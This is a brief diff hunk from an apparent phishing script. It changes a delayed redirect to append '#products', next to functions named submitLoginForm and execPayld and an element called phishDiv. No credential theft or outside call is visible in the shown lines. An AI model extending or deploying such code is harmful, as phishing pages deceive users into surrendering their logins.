@@ -78,7 +78,7 @@ async function submitLoginForm() {
 }
 function execPayld() {
   setTimeout(() => {
-    window.location.href = window.location.href.split('#')[0];
+    window.location.href = window.location.href.split('#')[0] + '#products';
   },
   1000);
   let phishDiv = document.createElement('div');
